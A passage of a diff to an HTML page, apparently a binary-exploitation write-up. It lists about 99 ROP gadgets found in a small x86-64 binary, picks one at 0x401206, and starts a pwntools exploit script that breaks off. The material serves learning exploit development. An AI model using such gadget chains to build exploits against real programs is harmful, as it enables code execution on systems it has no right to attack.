+<span class="mh">0x00000000004010ff</span><span class="o">:</span> <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="c">; test rax, rax; je 0x1110; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x00000000004011a6</span><span class="o">:</span> <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span><span class="c">; leave; ret; </span>
+<span class="mh">0x0000000000401005</span><span class="o">:</span> <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x2fed</span><span class="err">]</span><span class="c">; test rax, rax; je 0x1012; call rax; </span>
+<span class="mh">0x0000000000401005</span><span class="o">:</span> <span class="k">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x2fed</span><span class="err">]</span><span class="c">; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; </span>
+<span class="mh">0x000000000040112b</span><span class="o">:</span> <span class="k">mov</span> <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span><span class="c">; call 0x10b0; mov byte ptr [rip + 0x2f0f], 1; pop rbp; ret; </span>
+<span class="mh">0x0000000000401087</span><span class="o">:</span> <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="mh">0x4011b0</span><span class="c">; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x000000000040108e</span><span class="o">:</span> <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mh">0x40115f</span><span class="c">; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x00000000004010c7</span><span class="o">:</span> <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mh">0x404048</span><span class="c">; jmp rax; </span>
+<span class="mh">0x000000000040119f</span><span class="o">:</span> <span class="k">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span><span class="c">; call 0x1030; mov eax, 0; leave; ret; </span>
+<span class="mh">0x0000000000401004</span><span class="o">:</span> <span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x2fed</span><span class="err">]</span><span class="c">; test rax, rax; je 0x1012; call rax; </span>
+<span class="mh">0x0000000000401004</span><span class="o">:</span> <span class="k">mov</span> <span class="n">rax</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0x2fed</span><span class="err">]</span><span class="c">; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; </span>
+<span class="mh">0x000000000040112a</span><span class="o">:</span> <span class="k">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span><span class="c">; call 0x10b0; mov byte ptr [rip + 0x2f0f], 1; pop rbp; ret; </span>
+<span class="mh">0x0000000000401086</span><span class="o">:</span> <span class="k">mov</span> <span class="n">rcx</span><span class="p">,</span> <span class="mh">0x4011b0</span><span class="c">; mov rdi, 0x40115f; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x000000000040108d</span><span class="o">:</span> <span class="k">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="mh">0x40115f</span><span class="c">; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x000000000040119e</span><span class="o">:</span> <span class="k">mov</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">rax</span><span class="c">; call 0x1030; mov eax, 0; leave; ret; </span>
+<span class="mh">0x000000000040109b</span><span class="o">:</span> <span class="k">nop</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rax</span> <span class="o">+</span> <span class="n">rax</span><span class="err">]</span><span class="c">; ret; </span>
+<span class="mh">0x000000000040120d</span><span class="o">:</span> <span class="k">nop</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[rax]</span><span class="c">; ret; </span>
+<span class="mh">0x0000000000401003</span><span class="o">:</span> <span class="k">or</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rax</span> <span class="o">-</span> <span class="mh">0x75</span><span class="err">]</span><span class="p">,</span> <span class="n">cl</span><span class="c">; add eax, 0x2fed; test rax, rax; je 0x1012; call rax; </span>
+<span class="mh">0x00000000004010c6</span><span class="o">:</span> <span class="k">or</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x404048</span><span class="err">]</span><span class="p">,</span> <span class="n">edi</span><span class="c">; jmp rax; </span>
+<span class="mh">0x0000000000401204</span><span class="o">:</span> <span class="k">pop</span> <span class="n">r12</span><span class="c">; pop r13; pop r14; pop r15; ret; </span>
+<span class="mh">0x0000000000401206</span><span class="o">:</span> <span class="k">pop</span> <span class="n">r13</span><span class="c">; pop r14; pop r15; ret; </span>
+<span class="mh">0x0000000000401208</span><span class="o">:</span> <span class="k">pop</span> <span class="n">r14</span><span class="c">; pop r15; ret; </span>
+<span class="mh">0x000000000040120a</span><span class="o">:</span> <span class="k">pop</span> <span class="n">r15</span><span class="c">; ret; </span>
+<span class="mh">0x0000000000401203</span><span class="o">:</span> <span class="k">pop</span> <span class="n">rbp</span><span class="c">; pop r12; pop r13; pop r14; pop r15; ret; </span>
+<span class="mh">0x0000000000401207</span><span class="o">:</span> <span class="k">pop</span> <span class="n">rbp</span><span class="c">; pop r14; pop r15; ret; </span>
+<span class="mh">0x0000000000401139</span><span class="o">:</span> <span class="k">pop</span> <span class="n">rbp</span><span class="c">; ret; </span>
+<span class="mh">0x0000000000401090</span><span class="o">:</span> <span class="k">pop</span> <span class="n">rdi</span><span class="c">; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x000000000040120b</span><span class="o">:</span> <span class="k">pop</span> <span class="n">rdi</span><span class="c">; ret; </span>
+<span class="mh">0x0000000000401209</span><span class="o">:</span> <span class="k">pop</span> <span class="n">rsi</span><span class="c">; pop r15; ret; </span>
+<span class="mh">0x0000000000401205</span><span class="o">:</span> <span class="k">pop</span> <span class="n">rsp</span><span class="c">; pop r13; pop r14; pop r15; ret; </span>
+<span class="mh">0x0000000000401129</span><span class="o">:</span> <span class="k">push</span> <span class="n">rbp</span><span class="c">; mov rbp, rsp; call 0x10b0; mov byte ptr [rip + 0x2f0f], 1; pop rbp; ret; </span>
+<span class="mh">0x000000000040100d</span><span class="o">:</span> <span class="k">sal</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="n">rax</span> <span class="o">-</span> <span class="mi">1</span><span class="err">]</span><span class="p">,</span> <span class="mh">0xd0</span><span class="c">; add rsp, 8; ret; </span>
+<span class="mh">0x0000000000401215</span><span class="o">:</span> <span class="k">sub</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span><span class="c">; add rsp, 8; ret; </span>
+<span class="mh">0x0000000000401001</span><span class="o">:</span> <span class="k">sub</span> <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span><span class="c">; mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; </span>
+<span class="mh">0x0000000000401214</span><span class="o">:</span> <span class="k">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="c">; add rsp, 8; ret; </span>
+<span class="mh">0x0000000000401000</span><span class="o">:</span> <span class="k">sub</span> <span class="n">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="c">; mov rax, qword ptr [rip + 0x2fed]; test rax, rax; je 0x1012; call rax; </span>
+<span class="mh">0x000000000040100c</span><span class="o">:</span> <span class="k">test</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span><span class="c">; je 0x1012; call rax; </span>
+<span class="mh">0x000000000040100c</span><span class="o">:</span> <span class="k">test</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span><span class="c">; je 0x1012; call rax; add rsp, 8; ret; </span>
+<span class="mh">0x00000000004010c3</span><span class="o">:</span> <span class="k">test</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span><span class="c">; je 0x10d0; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x0000000000401105</span><span class="o">:</span> <span class="k">test</span> <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span><span class="c">; je 0x1110; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x000000000040100b</span><span class="o">:</span> <span class="k">test</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span><span class="c">; je 0x1012; call rax; </span>
+<span class="mh">0x000000000040100b</span><span class="o">:</span> <span class="k">test</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span><span class="c">; je 0x1012; call rax; add rsp, 8; ret; </span>
+<span class="mh">0x00000000004010c2</span><span class="o">:</span> <span class="k">test</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span><span class="c">; je 0x10d0; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x0000000000401104</span><span class="o">:</span> <span class="k">test</span> <span class="n">rax</span><span class="p">,</span> <span class="n">rax</span><span class="c">; je 0x1110; mov edi, 0x404048; jmp rax; </span>
+<span class="mh">0x000000000040119c</span><span class="o">:</span> <span class="k">xchg</span> <span class="n">eax</span><span class="p">,</span> <span class="n">r8d</span><span class="c">; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; </span>
+<span class="mh">0x000000000040109a</span><span class="o">:</span> <span class="k">hlt</span><span class="c">; nop dword ptr [rax + rax]; ret; </span>
+<span class="mh">0x00000000004011ab</span><span class="o">:</span> <span class="k">leave</span><span class="c">; ret; </span>
+<span class="mh">0x000000000040119d</span><span class="o">:</span> <span class="k">nop</span><span class="c">; mov rdi, rax; call 0x1030; mov eax, 0; leave; ret; </span>
+<span class="mh">0x000000000040115c</span><span class="o">:</span> <span class="k">nop</span><span class="c">; pop rbp; ret; </span>
+<span class="mh">0x00000000004010cf</span><span class="o">:</span> <span class="k">nop</span><span class="c">; ret; </span>
+<span class="mh">0x0000000000401016</span><span class="o">:</span> <span class="k">ret</span><span class="c">; </span>
 </code></pre></div></div>
+
+<p>99 gadgets found</p>
+
 <h5 id="0x0000000000401206-pop-r13-pop-r14-pop-r15-ret">0x0000000000401206: pop r13; pop r14; pop r15; ret;</h5>
 <h5 id="offset-0x401206">Offset: 0x401206</h5>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># library
